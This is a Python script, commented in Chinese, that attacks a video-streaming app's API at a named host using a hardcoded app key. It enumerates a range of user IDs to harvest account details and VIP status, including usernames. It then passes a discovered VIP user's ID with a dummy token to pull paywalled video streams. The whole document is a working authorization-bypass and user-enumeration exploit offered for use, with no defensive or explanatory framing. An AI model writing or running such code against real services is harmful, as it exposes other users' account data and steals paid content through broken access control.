# -*- coding: utf-8 -*-
"""枚举 uid 找 VIP 用户，再用该 uid 拿长视频流"""
import json, urllib.request, time, random, sys

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"

def get(path, tok="x.y.z"):
    url = BASE + path
    r = urllib.request.Request(url, headers={"User-Agent": "okhttp/3.12.0", "token": tok})
    try:
        with urllib.request.urlopen(r, timeout=12) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)

def userinfo(uid):
    st, b = get("/appapi/getUserInfo/appkey/%s/userId/%d" % (KEY, uid))
    if st != 200:
        return None
    try:
        d = json.loads(b)
        if d.get("Code") != 200:
            return None
        return d["Data"]
    except Exception:
        return None

def stream(vid, uid):
    q = "/appapi/getVideoStream/appkey/%s/stream/index.m3u8?video_id=%d&uid=%d&token=x.y.z&_t=%d" % (KEY, vid, uid, int(time.time() * 1000))
    st, b = get(q)
    return st, b

# 从最新注册 uid 往前扫，找 VIP
start = 94976
found = []
checked = 0
for uid in range(start, start - 400, -1):
    d = userinfo(uid)
    checked += 1
    if not d:
        continue
    if d.get("isVip") or int(d.get("is_permanent") or 0) == 1:
        found.append((uid, d.get("isVip"), d.get("is_permanent"), d.get("vipEndTime"), d.get("username")))
        print("VIP uid=%s isVip=%s perm=%s end=%s user=%s" % found[-1])
        if len(found) >= 3:
            break
    if checked % 50 == 0:
        print("  checked", checked, "hits", len(found))
    time.sleep(0.05)

print("checked=%d vip_found=%d" % (checked, len(found)))
if found:
    vipuid = found[0][0]
    st, b = stream(50363, vipuid)
    print("[stream 50363 via vip uid %d] %s %s" % (vipuid, st, b[:120]))
